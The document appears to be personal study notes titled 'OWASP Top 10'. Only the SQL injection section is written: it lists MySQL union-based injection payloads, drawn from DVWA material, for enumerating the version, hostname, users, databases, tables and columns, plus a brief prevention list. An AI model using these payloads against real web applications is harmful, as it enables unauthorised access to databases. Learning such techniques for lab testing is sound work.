# OWASP Top 10

## SQL Injection
```sql 
-- Select all possible data
SELECT First_Name,Last_Name FROM users WHERE ID=a’ OR ”=’;
```
- [Reference Link](https://pentestlab.blog/2012/09/18/sql-injection-exploitation-dvwa/)
##### MySql
```sql
    SELECT version()
    SELECT @@version

    --select DB version
    SELECT First_Name,Last_Name FROM users WHERE ID= '' union select 1,@@version#;

    --select DB hostname
    SELECT First_Name,Last_Name FROM users WHERE ID= '' union select null,@@hostname#;

    -- get database user
    SELECT user();
    SELECT current_user;
    SELECT system_user();

    -- get database name
    SELECT First_Name,Last_Name FROM users WHERE ID= '' union select null,database()#;

    -- list all the available databases name
    SELECT schema_name from information_schema.schemata

    SELECT First_Name,Last_Name FROM users WHERE ID= '' union select null,schema_name from information_schema.schemata#;

    -- retrieve table names
    SELECT table_name from information_schema.tables

    -- retrieve table name from specific Database

    SELECT table_name from information_schema.tables where table_schema = 'EthereumGames'

    -- retrieve columns from specific table
    -- 0x0a is whitespace
    select concat(table_name,0x0a,column_name) from information_schema.columns where table_name= 'Account'

    -- retrieve location of database
    select @@datadir 
```

### Prevention
1. Using parameter holder: System will automatically escape symbo from text and turn it to string.
2. Using store procedure: We can set application exceution permission for preventing delete.

### Broken authentication and session management

